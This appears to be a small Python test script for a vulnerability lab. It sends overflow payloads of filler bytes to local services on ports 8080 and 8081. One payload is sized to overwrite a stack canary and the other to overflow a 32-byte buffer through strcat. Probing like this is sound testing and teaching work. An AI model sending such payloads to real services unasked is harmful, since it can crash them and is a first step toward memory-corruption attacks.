import socket
import sys

def test_overflow_001():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the server
    try:
        s.connect(('localhost', 8080))
        
        # Create a payload that will help us see the overflow
        # First 8 bytes are 'A's (buffer size)
        # Next 4 bytes will overwrite the canary
        payload = b'A' * 8 + b'B' * 4 + b'C' * 4
        
        # Send the payload
        s.send(payload)
        print("Sent payload to port 8080")
        print("Payload structure:")
        print("  - 8 bytes of 'A' (buffer size)")
        print("  - 4 bytes of 'B' (should overwrite canary)")
        print("  - 4 bytes of 'C' (overflow)")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def test_overflow_002():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the server
    try:
        s.connect(('localhost', 8081))  # Note: second function uses PORT + 1
        
        # Create a payload that will demonstrate strcat overflow
        # The buffer starts with "INIT" (4 bytes)
        # We'll send enough data to overflow when concatenated
        payload = b'X' * 40  # 40 bytes of 'X' characters
        
        # Send the payload
        s.send(payload)
        print("\nSent payload to port 8081")
        print("Payload structure:")
        print("  - 40 bytes of 'X' characters")
        print("  - Will be concatenated to 'INIT' in the buffer")
        print("  - Should overflow the 32-byte buffer")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    print("Testing first vulnerability (port 8080)...")
    test_overflow_001()
    
    print("\nTesting second vulnerability (port 8081)...")
    test_overflow_002() 